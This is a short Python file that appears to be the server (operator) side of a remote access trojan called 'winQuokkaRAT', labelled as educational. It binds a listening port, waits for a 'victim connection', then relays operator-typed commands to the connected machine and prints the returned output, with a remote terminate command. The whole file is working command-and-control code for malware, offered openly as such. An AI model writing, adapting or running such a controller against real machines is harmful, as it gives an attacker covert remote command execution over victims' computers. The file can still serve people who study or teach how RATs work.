#attack_server

import socket
import os

HOST = '0.0.0.0' # any ip addr
PORT = 9001 #free port of host

def bind_listen(sock,host,port):
    try:
        sock.bind((host, port))
        print(f"Listening : {port}")
    except socket.error as e:
        print(f"Listening Fail : {e}")
        os.system('pause')
    sock.listen(1)
    print('Waiting for victim connection...')

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def send_and_recv(conn_param,message): # socket send safe function. if send empty buffer, server cannot get. so should be altered
    BUFFER_SIZE=50000
    if(message==''):
        print("null message error...") #빈 패킷을 보내지않도록 처리
        return 0
    conn_param.send(message.encode())
    print("wait for client message...")
    recved = conn_param.recv(BUFFER_SIZE).decode('utf-8')
    print(recved)
    return recved


print("######### winQuokkaRAT SERVER EDUCARTION ######")

my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while(True):
    try:
        bind_listen(my_sock,HOST,PORT)
        break
    except Exception as e:
        print(e)
        print(f"port 사용중 : {PORT}")


conn, addr = my_sock.accept()
print('\n')
print('Connected by', addr)
while True: # re loop while
    try:
        cmd = input('$')
        if(len(cmd)>0):  #빈 버퍼를 보내면 상대가 받지못한다. 그러면 무한 교착상태 발생
            ## command
            if(cmd=="cls"):
                clear_console()
            elif(cmd[:4]=="term"):
                print("Remote Terminate Executed")
                send_and_recv(conn,cmd)
            else:
                send_and_recv(conn,cmd)
            

    except Exception as e:
        print(e)
        os.system("pause")